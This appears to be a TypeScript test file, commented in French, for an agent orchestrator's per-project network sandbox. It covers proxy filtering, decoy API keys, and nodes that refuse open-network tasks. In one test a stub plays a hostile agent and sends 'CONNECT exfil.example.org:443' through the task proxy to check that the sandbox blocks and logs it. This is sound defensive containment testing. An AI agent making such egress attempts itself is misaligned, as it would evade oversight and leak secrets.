// Le réseau des agents d'un PROJET, de bout en bout : le réglage humain à la
// Reine, porté par chaque assignation, appliqué par le nœud — ou refusé par
// un nœud `exige` quand le projet est `ouvert`.
//
// Une vraie Reine, un vrai HiveNodeClient, un adaptateur de banc qui regarde
// ce que le nœud lui donne ET essaie de sortir par le proxy de sa tâche.

import { mkdtempSync, rmSync } from 'node:fs';
import { connect } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { AdapterContext, AdapterResult, AgentAdapter } from '../src/adapters/index.js';
import { HiveNodeClient } from '../src/node-client/client.js';
import { fournisseurParNom, type Fournisseur } from '../src/node-client/isolement.js';
import type { CapaciteReseau } from '../src/node-client/reseau-tache.js';
import { createServer, type HiveServer } from '../src/orchestrator/server.js';
import { parseServerMessage } from '../src/shared/protocol.js';
import type { Task } from '../src/shared/types.js';

const JETON = 'jeton-reseau-projet-suffisamment-long';
const BWRAP = fournisseurParNom('bubblewrap') as Fournisseur;

let serveur: HiveServer | null = null;
const clients: HiveNodeClient[] = [];
let dossier = '';

afterEach(async () => {
  vi.unstubAllEnvs();
  for (const c of clients.splice(0)) c.stop();
  await serveur?.stop();
  serveur = null;
  if (dossier) rmSync(dossier, { recursive: true, force: true, maxRetries: 3 });
  dossier = '';
});

async function attendre(condition: () => boolean, message: string): Promise<void> {
  const fin = Date.now() + 15_000;
  while (!condition() && Date.now() < fin) await new Promise((r) => setTimeout(r, 30));
  expect(condition(), message).toBe(true);
}

async function reine(): Promise<HiveServer> {
  dossier = mkdtempSync(path.join(os.tmpdir(), 'hive-reseau-projet-'));
  serveur = await createServer({
    port: 0,
    host: '127.0.0.1',
    token: JETON,
    corsOrigins: ['http://localhost:5173'],
    dbPath: path.join(dossier, 'hive.db'),
    simulation: false,
    tickMs: 40,
  });
  return serveur;
}

describe('assign_task : le champ `reseau`', () => {
  const brut = (extra: Record<string, unknown>) =>
    JSON.stringify({
      type: 'assign_task',
      task: {
        id: 't',
        projectId: 'p',
        title: 'x',
        prompt: 'x',
        status: 'assigned',
        dependsOn: [],
        assignedNodeId: null,
        result: null,
        branch: null,
        attempts: 0,
        createdAt: 0,
        updatedAt: 0,
      },
      ...extra,
    });

  it('un niveau connu passe ; un niveau inconnu fait tomber le message ; absent, rien', () => {
    expect(parseServerMessage(brut({ reseau: 'integrations' }))).toMatchObject({
      reseau: 'integrations',
    });
    expect(parseServerMessage(brut({}))).not.toHaveProperty('reseau');
    expect(parseServerMessage(brut({ reseau: 'ferme' }))).toBeNull();
    expect(parseServerMessage(brut({ reseau: true }))).toBeNull();
  });
});

describe('le réglage à la Reine', () => {
  it('défaut « dependances », réglé par le jeton sur un orphelin, effacé avec le projet', async () => {
    const srv = await reine();
    const p = srv.store.createProject({ name: 'P' });
    const lire = async () =>
      (await fetch(`http://127.0.0.1:${srv.port}/api/projects/${p.id}/reseau`, {
        headers: { 'x-hive-token': JETON },
      }).then((r) => r.json())) as { niveau: string; regle: boolean; niveaux: string[] };
    expect(await lire()).toMatchObject({
      niveau: 'dependances',
      regle: false,
      niveaux: ['integrations', 'dependances', 'ouvert'],
    });
    const regler = (niveau: unknown) =>
      fetch(`http://127.0.0.1:${srv.port}/api/projects/${p.id}/reseau`, {
        method: 'PUT',
        headers: { 'x-hive-token': JETON, 'content-type': 'application/json' },
        body: JSON.stringify({ niveau }),
      });
    expect((await regler('integrations')).status).toBe(200);
    expect(await lire()).toMatchObject({ niveau: 'integrations', regle: true });
    expect((await regler('ferme')).status).toBe(400);
    expect(srv.store.niveauReseau(p.id)).toBe('integrations');
    const bilan = srv.store.effacerProjet(p.id);
    expect(bilan?.reseaux_projets).toBe(1);
  });
});

describe('une vraie ruche : le niveau du projet arrive au nœud, qui l’applique', () => {
  function noeud(
    srv: HiveServer,
    adaptateur: AgentAdapter,
    reseau: CapaciteReseau,
  ): HiveNodeClient {
    const c = new HiveNodeClient({
      url: `ws://127.0.0.1:${srv.port}/ws`,
      token: JETON,
      name: 'ouvriere-claude',
      ownerName: 'banc',
      agentType: 'claude-code',
      maxConcurrency: 1,
      workRoot: path.join(dossier, 'noeud'),
      adapter: adaptateur,
      keepEnv: ['ANTHROPIC_API_KEY'],
      // Un bac déclaré, jamais lancé : l'adaptateur de banc ne l'enveloppe pas.
      bac: { fournisseur: BWRAP, image: 'x', variables: ['ANTHROPIC_API_KEY'] },
      reseau,
      quiet: true,
    });
    clients.push(c);
    c.start();
    return c;
  }

  it(
    'projet « integrations » : proxy, leurre, refus au journal et bilan dans les logs',
    { timeout: 30_000 },
    async () => {
      vi.stubEnv('ANTHROPIC_API_KEY', 'sk-ant-api03-VRAIE-CLE-DU-MEMBRE');
      const srv = await reine();
      const vus: { env: NodeJS.ProcessEnv; reseau: AdapterContext['bac'] }[] = [];
      noeud(
        srv,
        {
          name: 'claude-code',
          async run(_task: Task, ctx: AdapterContext): Promise<AdapterResult> {
            vus.push({ env: ctx.env, reseau: ctx.bac });
            // Ce qu'un agent hostile tenterait : sortir hors liste par le proxy.
            const socket = ctx.bac?.reseau?.socket ?? '';
            await new Promise<void>((resolve) => {
              const s = connect(socket);
              s.on('data', () => {});
              s.on('close', () => resolve());
              s.on('error', () => resolve());
              s.write('CONNECT exfil.example.org:443 HTTP/1.1\r\nHost: x\r\n\r\n');
            });
            return { success: true, diff: '', logs: 'fini', subAgents: [] };
          },
        },
        { filtre: true, exige: false, motif: 'banc' },
      );
      await attendre(
        () => srv.store.listNodes().some((n) => n.status === 'online'),
        'le nœud ne rejoint pas la ruche',
      );
      const p = srv.store.createProject({ name: 'P' });
      srv.store.setReseauProjet(p.id, 'integrations', 'humain');
      const t = srv.store.createTask({ projectId: p.id, title: 'Tâche', prompt: 'x' });
      srv.store.patchTask(t.id, { status: 'ready' });
      await attendre(() => srv.store.getTask(t.id)?.status === 'done', 'la tâche ne finit pas');

      const vu = vus[0];
      expect(vu?.env.ANTHROPIC_API_KEY).toMatch(/^sk-ant-api03-hive-leurre-/);
      expect(vu?.reseau?.reseau?.variables.ANTHROPIC_BASE_URL).toBe(
        'http://127.0.0.1:3128/hive-api/anthropic',
      );
      const journal = srv.store
        .listEvents(0, 500)
        .map((e) => JSON.stringify(e.payload))
        .join('\n');
      expect(journal).toContain('réseau filtré (niveau « integrations »)');
      expect(journal).toContain('réseau refusé');
      expect(journal).toContain('exfil.example.org');
      // La vraie clé ne part JAMAIS au hub.
      expect(journal).not.toContain('VRAIE-CLE-DU-MEMBRE');
    },
  );

  it(
    'nœud « exige » + projet « ouvert » : refus poli, l’agent ne tourne pas',
    { timeout: 30_000 },
    async () => {
      const srv = await reine();
      let lance = false;
      noeud(
        srv,
        {
          name: 'claude-code',
          async run(): Promise<AdapterResult> {
            lance = true;
            return { success: true, diff: '', logs: '', subAgents: [] };
          },
        },
        { filtre: true, exige: true, motif: 'banc' },
      );
      await attendre(
        () => srv.store.listNodes().some((n) => n.status === 'online'),
        'le nœud ne rejoint pas la ruche',
      );
      const p = srv.store.createProject({ name: 'P' });
      srv.store.setReseauProjet(p.id, 'ouvert', 'humain');
      const t = srv.store.createTask({ projectId: p.id, title: 'Tâche', prompt: 'x' });
      srv.store.patchTask(t.id, { status: 'ready' });
      await attendre(
        () =>
          srv.store
            .listEvents(0, 500)
            .some(
              (e) =>
                e.type === 'task_rejected' &&
                String((e.payload as { reason?: string }).reason).includes('HIVE_ISOLEMENT=exige'),
            ),
        'le refus exige n’arrive pas au journal',
      );
      expect(lance).toBe(false);
    },
  );
});
